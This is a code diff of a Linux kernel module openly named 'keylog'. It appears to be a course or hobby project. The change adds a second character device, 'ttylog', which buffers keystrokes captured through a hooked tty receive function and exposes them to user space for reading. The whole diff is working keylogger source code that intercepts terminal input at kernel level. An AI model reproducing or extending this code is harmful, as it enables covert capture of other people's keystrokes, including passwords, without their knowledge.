@@ -22,15 +22,18 @@
 #define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );
 
 #define KEYLOG_MAJOR 65
-#define KEYLOG_NAME  "keylog"
+#define KEYLOG_NAME "keylog"
+#define TTY_MAJOR 66
+#define TTY_NAME "ttylog"
 
 #define KEYLOG_BUF_SIZE 1024
 #define MAX_REGISTERED_PROCS 5
 
 MODULE_LICENSE( "Dual BSD/GPL" );
 
-static char *key_buffer = NULL, *pid_buffer = NULL;
-static int  cur_buf_length = 0;
+static char *key_buffer = NULL, *tty_buffer = NULL, *pid_buffer = NULL;
+static int cur_buf_length = 0;
+static int cur_ttybuf_length = 0;
 static pid_t registered_pids[MAX_REGISTERED_PROCS];
 static int registered_proc_count = 0;
 
@@ -41,11 +44,19 @@ struct tty_struct *tty;
 
 int key_open( struct inode *inode, struct file *filp );
 ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
+ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
 ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos );
 int key_release( struct inode *inode, struct file *filp );
 
 struct file_operations fops = {
     read:    key_read,
+    write:   key_write,
+    open:    key_open,
+    release: key_release,
+};
+
+struct file_operations ttyops = {
+    read:    tty_read,
     write:   key_write,
     open:    key_open,
     release: key_release,
@@ -126,6 +137,24 @@ ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
     }
 }
 
+ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
+    int err = 0;
+
+    if ( *f_pos == 0 ) {
+        err = copy_to_user( buf, tty_buffer, cur_ttybuf_length );
+        if ( err < 0 ) {
+            print812( "Copying to user failed (%d)", err );
+            return err;
+        }
+
+        *f_pos = cur_ttybuf_length;
+        cur_ttybuf_length = 0; // Reset buf length to read more content
+        return *f_pos;
+    } else {
+        return 0;
+    }
+}
+
 struct file* file_open(const char* path, int flags, int rights) {
     struct file* filp = NULL;
     mm_segment_t oldfs;
@@ -196,8 +225,8 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
             
             key_name = get_tty_key_str(dstStr, count);
 
-            if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
-                cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
+            if ( strlen( key_name ) + cur_ttybuf_length < KEYLOG_BUF_SIZE ) {
+                cur_ttybuf_length += sprintf( tty_buffer + cur_ttybuf_length, "%s", key_name );
             }
             
             // Wait until a command has been entered before notifying listeners
@@ -250,12 +279,31 @@ static int hello_init( void ) {
         return err;
     }
 
+    err = register_chrdev( TTY_MAJOR, TTY_NAME, &ttyops );
+    if ( err < 0 ) {
+        print812( "Registering chrdev failed (%d)", err );
+        return err;
+    }
+
     key_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
     if ( !key_buffer ) {
         err = -ENOMEM;
         print812( "Failed to allocate keybuffer (%d)", err );
         
         unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
+        unregister_chrdev( TTY_MAJOR, TTY_NAME );
+        
+        return err;
+    }
+
+    tty_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
+    if ( !tty_buffer ) {
+        err = -ENOMEM;
+        print812( "Failed to allocate tty buffer (%d)", err );
+
+        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
+        unregister_chrdev( TTY_MAJOR, TTY_NAME );
+
         return err;
     }
 
@@ -265,6 +313,8 @@ static int hello_init( void ) {
         print812( "Failed to allocate pidbuffer(%d)", err );
 
         unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
+        unregister_chrdev( TTY_MAJOR, TTY_NAME );
+
         return err;
     }
     
@@ -307,9 +357,14 @@ static void hello_exit( void ) {
     }
 
     unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
+    unregister_chrdev( TTY_MAJOR, TTY_NAME );
 
     if ( key_buffer != NULL ) {
         kfree( key_buffer );
+    }
+
+    if ( tty_buffer != NULL ) {
+        kfree( tty_buffer );
     }
 
     if ( pid_buffer != NULL ) {
